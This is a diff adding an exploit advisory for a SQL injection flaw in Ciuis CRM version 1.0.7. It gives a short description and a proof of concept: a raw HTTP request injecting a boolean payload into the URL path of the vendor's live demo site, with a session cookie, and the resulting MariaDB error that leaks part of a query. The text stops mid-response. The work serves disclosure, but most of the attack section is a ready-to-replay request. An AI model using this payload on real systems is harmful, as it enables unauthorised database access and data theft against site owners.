@@ -1,0 +1,48 @@
+# Exploit Title: [Ciuis CRM v 1.0.7 Sql Injection]
+# Google Dork: [if applicable]
+# Date: [12/15/2017]
+# Exploit Author: [Zahid Abbasi]
+# Contact: http://twitter.com/zahidsec
+# Website: http://zahidabbasi.com
+# Vendor Homepage: [http://ciuis.com/]
+# Software Link: [https://codecanyon.net/item/ciuis-crm/20473489]
+# Version: [1.0.7] (REQUIRED)
+# Tested on: [Win 7 64-bit]
+# CVE : [if applicable]
+
+1. Description
+
+The injection required user registration on CIUS CRM. Old versions have 
+not been tested but it's a guess, they are also vulnerable.
+The URL path filename appears to be vulnerable to SQL injection attacks.
+The payload 65079277 or 7647=07647 was submitted in the URL path 
+filename, and a database error message was returned.
+You should review the contents of the error message, and the 
+application's handling of other input, to confirm whether a 
+vulnerability is present.
+
+2. Proof of Concept
+
+The live testing was done on demo site of the script.
+https://ciuis.com/demo/accounts/account/4 [URL path filename]
+Request:-
+GET /demo/accounts/account/465079277%20or%207647%3d07647 HTTP/1.1
+Host: ciuis.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) 
+Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=98b5ef21cb2d123fb376f135218129226808fbec
+Connection: close
+Upgrade-Insecure-Requests: 1
+Response:-
+After placing our injection code and forwarding the request. The html 
+response is posted below.
+<div id="container">
+        <h1>A Database Error Occurred</h1>
+        <p>Error Number: 1064</p><p>You have an error in your SQL syntax; 
+check the manual that corresponds to your MariaDB server version for the 
+right syntax to use near 'and `transactiontype` =0)' at line 
+3</p><p>SELECT SUM(`amount`) AS `amount`
+--
